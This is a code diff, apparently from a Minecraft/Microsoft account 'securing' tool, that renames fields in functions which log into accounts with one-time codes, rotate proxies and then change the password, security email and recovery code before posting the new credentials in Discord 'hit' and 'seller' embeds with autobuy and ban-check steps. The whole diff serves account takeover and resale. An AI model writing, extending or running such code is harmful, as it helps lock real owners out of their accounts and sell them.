@@ -27,12 +27,12 @@ rom = logging.getLogger("romeo.orch")
 async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) -> dict:
     ms = (record.get("microsoft") or {}).copy()
     mc = (record.get("minecraft") or {}).copy()
-    sec = str(ms.get("security_email") or "").strip()
+    sec = str(ms.get("sec_mail") or "").strip()
     pwd = str(ms.get("password") or "").strip()
-    rec = str(ms.get("recovery_code") or "").strip()
-    origin = str(ms.get("original_email") or email or "").strip() or email
+    rec = str(ms.get("rec_code") or "").strip()
+    origin = str(ms.get("orig_email") or email or "").strip() or email
     primary = str(ms.get("email") or "").strip() or origin
-    swapped = ms.get("primary_alias_replaced")
+    swapped = ms.get("alias_swapped")
     if swapped is None and primary.lower() != origin.lower():
         swapped = True
 
@@ -48,12 +48,12 @@ async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) ->
 
     summary = {
         "email": primary,
-        "original_email": origin,
-        "security_email": sec or "Couldn't Change!",
+        "orig_email": origin,
+        "sec_mail": sec or "Couldn't Change!",
         "password": pwd or "Couldn't Change!",
-        "recovery_code": rec or "Couldn't Change!",
+        "rec_code": rec or "Couldn't Change!",
         "username": mc.get("name"),
-        "primary_alias_replaced": swapped,
+        "alias_swapped": swapped,
     }
     ms.update(summary)
 
@@ -62,7 +62,7 @@ async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) ->
         ms,
         why,
         error=detail,
-        credentials_changed=creds_changed,
+        creds_moved=creds_changed,
     )
 
     return {
@@ -71,25 +71,25 @@ async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) ->
         "error": public_decline_reason(detail),
         "microsoft": ms,
         "minecraft": mc,
-        "credentials_changed": creds_changed,
-        "hit_embed": fail,
-        "seller_embed": fail,
+        "creds_moved": creds_changed,
+        "hit_eb": fail,
+        "sell_eb": fail,
     }
 
 
 start_time = time.monotonic()
 
 
-async def romeo_secure(session: httpx.AsyncClient, email, device=None,
+async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
                                code=None, recovery=True, ppft=None, rextra=None,
-                               command=False, embed_verify: bool = False):
+                               command=False, embed_chk: bool = False):
     rom.info("door call — %s", email)
     account = {
         "microsoft": {
             "email": email or "Couldn't Change!",
-            "security_email": "Couldn't Change!",
+            "sec_mail": "Couldn't Change!",
             "password": "Couldn't Change!",
-            "recovery_code": "Couldn't Change!",
+            "rec_code": "Couldn't Change!",
             "auth_secret": "Disabled",
             "firstName": "Failed to Get",
             "lastName": "Failed to Get",
@@ -120,8 +120,8 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
         return await acquire_msauth(client, email, device, live, code, ppft)
 
     try:
-        msaauth, session = await retry_with_proxy(
-            session,
+        msaauth, sesja = await retry_with_proxy(
+            sesja,
             _login_pass,
             new_session=open_session,
             tries=4,
@@ -141,15 +141,15 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
 
     if not msaauth:
         return await _reject(email,
-            "Login failed — no msauth session. OTP wrong or expired.",
+            "Login failed — no msauth sesja. OTP wrong or expired.",
             account, creds_changed=False)
 
     if rextra:
         account["microsoft"]["password"] = rextra.get("password")
-        account["microsoft"]["security_email"] = rextra.get("security_email")
-        account["microsoft"]["recovery_code"] = rextra.get("recovery_code")
+        account["microsoft"]["sec_mail"] = rextra.get("sec_mail")
+        account["microsoft"]["rec_code"] = rextra.get("rec_code")
 
-    if embed_verify and msaauth == "Family":
+    if embed_chk and msaauth == "Family":
         rom.warning("embed verify — family interrupt, going cookies-only")
         msaauth = {"_cookies_only": True}
 
@@ -167,7 +167,7 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
         case _:
             rom.debug("msauth acquired — polishing")
             try:
-                await polish_session(session, msaauth)
+                await polish_session(sesja, msaauth)
             except Exception:
                 rom.exception("polish_session threw — carrying on")
                 print("[!] — polish_session threw; carrying cookies")
@@ -178,11 +178,11 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
             for attempt in range(1, tries + 1):
                 try:
                     account = await lock_account(
-                        session=session,
+                        sesja=sesja,
                         recovery=recovery,
                         record=account,
                         command=command,
-                        embed_verify=embed_verify,
+                        embed_chk=embed_chk,
                     )
                     last = None
                     break
@@ -193,12 +193,12 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
                                      exc.__class__.__name__, email, attempt, tries)
                         print(f"[!] — lock threw ({exc.__class__.__name__}) ({attempt}/{tries}) — rotating proxy…")
                         try:
-                            nxt = clone_with_fresh_proxy(session)
+                            nxt = clone_with_fresh_proxy(sesja)
                         except Exception:
                             rom.exception("clone failed")
                             nxt = None
                         if nxt:
-                            session = nxt
+                            sesja = nxt
                         await asyncio.sleep(1.5 * attempt)
                         continue
                     break
@@ -209,7 +209,7 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
                 print(f"[x] — lock_account crashed: {detail}")
 
                 amc_hit = "get_amc" in str(last).lower() or "account.microsoft.com" in str(last).lower()
-                if amc_hit and not (bool(rextra) or (account.get("microsoft") or {}).get("primary_alias_replaced") is True):
+                if amc_hit and not (bool(rextra) or (account.get("microsoft") or {}).get("alias_swapped") is True):
                     msg = f"ms portal unreachable ({detail}). Login worked; pw/email unchanged. Retry submit."
                 elif proxy_error_reason(last) == "network":
                     msg = f"Locking step network timeout: {detail}. Login done; creds above may already differ. Retry lock."
@@ -225,11 +225,11 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
         and "UNVERIFIED" not in str((account.get("microsoft") or {}).get("password") or "")
     )
 
-    if (account.get("microsoft") or {}).get("primary_alias_replaced") is True:
+    if (account.get("microsoft") or {}).get("alias_swapped") is True:
         creds_changed = True
 
     reject = rejection_cause(account)
-    if embed_verify:
+    if embed_chk:
         if reject:
             rom.debug("embed verify — skipping autobuy reject (%s)", reject)
         ban_hit = await run_ban_sweep(account)
@@ -260,20 +260,20 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
             color=0x279CF5,
         )
         fb.add_field(name="Primary", value=f"```{ms.get('email', 'Unknown')}```", inline=False)
-        fb.add_field(name="Security Email", value=f"```{ms.get('security_email', 'Unknown')}```", inline=True)
+        fb.add_field(name="Security Email", value=f"```{ms.get('sec_mail', 'Unknown')}```", inline=True)
         fb.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
-        fb.add_field(name="Recovery", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
+        fb.add_field(name="Recovery", value=f"```{ms.get('rec_code', 'Unknown')}```", inline=False)
         fb.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
         add_cred_line_field(
             fb,
             email=ms.get("email", ""),
-            recovery=ms.get("recovery_code", ""),
+            recovery=ms.get("rec_code", ""),
             password=ms.get("password", ""),
-            security_email=ms.get("security_email", ""),
+            sec_mail=ms.get("sec_mail", ""),
             username=account["minecraft"].get("name", ""),
         )
         return {
-            "hit_embed": fb,
+            "hit_eb": fb,
             "account_id": aid,
             "minecraft": account["minecraft"],
             "details": {
@@ -289,9 +289,9 @@ async def romeo_secure(session: httpx.AsyncClient, email, device=None,
                 "account_details": (
                     f"**Username:** {account['minecraft'].get('name', 'Unknown')}\n"
                     f"**Email:** {ms.get('email', 'Unknown')}\n"
-                    f"**Security Email:** {ms.get('security_email', 'Unknown')}\n"
+                    f"**Security Email:** {ms.get('sec_mail', 'Unknown')}\n"
                     f"**Password:** {ms.get('password', 'Unknown')}\n"
-                    f"**Recovery:** {ms.get('recovery_code', 'Unknown')}"
+                    f"**Recovery:** {ms.get('rec_code', 'Unknown')}"
                 ),
             },
         }
